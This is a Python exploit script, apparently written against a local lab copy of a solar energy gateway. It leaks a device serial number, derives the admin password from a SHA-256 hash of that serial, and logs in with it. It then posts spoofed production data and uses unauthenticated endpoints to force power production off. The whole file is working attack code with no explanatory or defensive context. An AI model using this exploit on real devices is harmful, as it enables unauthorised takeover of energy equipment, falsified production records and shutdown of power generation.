import requests
import hashlib

TARGET = "http://localhost:5000"

# Step 1: Leak serial number
resp = requests.get(f"{TARGET}/api/device_info")
serial = resp.json()["serial_number"]
print(f"[+] Serial number leaked: {serial}")

# Step 2: Generate password from serial
def generate_password(serial):
    return hashlib.sha256(serial.encode()).hexdigest()[:8]

password = generate_password(serial)
print(f"[+] Derived password: {password}")

# Step 3: Log in using generated password
login_resp = requests.post(f"{TARGET}/api/login", json={
    "username": "admin",
    "password": password
})
if login_resp.status_code != 200:
    print("[-] Login failed")
    exit(1)

token = login_resp.json()["token"]
print(f"[+] Auth token received: {token}")

# Step 4: Spoof production data
spoof_resp = requests.post(f"{TARGET}/api/fake_production",
                           headers={"Authorization": token},
                           json={"production_kw": 9999.99})

if spoof_resp.status_code == 200:
    print(f"[+] Successfully spoofed production data.")
else:
    print(f"[-] Failed to spoof data: {spoof_resp.json()}")
    
# Step 5: Check power state (unauthenticated)
print("[*] Checking current power state...")
resp = requests.get(f"{TARGET}/ivp/mod/603980032/mode/power")
print(resp.json())

# Step 6: Disable production (unauthenticated)
print("[*] Disabling power production...")
resp = requests.post(f"{TARGET}/ivp/mod/603980032/mode/power", json={"powerForcedOff": True})
print(resp.json())

# Step 7: Confirm state changed
resp = requests.get(f"{TARGET}/ivp/mod/603980032/mode/power")
print(resp.json())
